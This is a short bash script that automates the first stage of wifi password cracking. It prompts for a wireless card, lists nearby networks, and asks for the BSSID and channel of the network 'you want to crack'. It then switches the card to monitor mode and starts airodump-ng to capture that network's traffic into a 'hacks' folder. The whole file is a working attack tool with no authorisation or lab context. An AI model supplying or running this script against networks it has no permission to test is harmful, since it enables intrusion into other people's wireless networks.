#! /bin/bash

# show information about you wifi card
iwconfig
printf "Write name of your wifi card: "
read wifi_card

# stop monitor mode, if enabled
wifi_card_mon=$wifi_card"mon"
airmon-ng stop $wifi_card_mon

# show information about wireless hotspots
nmcli dev wifi list

printf "Write bssid of device, which you want to crack: "
read bssid
printf "Write channel of device: "
read channel

# start monitor mode and kill processes
airmon-ng start $wifi_card

# start capturing data
echo $wifi_card_mon
mkdir "hacks"
airodump-ng --bssid $bssid --channel $channel -w "hacks/try" $wifi_card_mon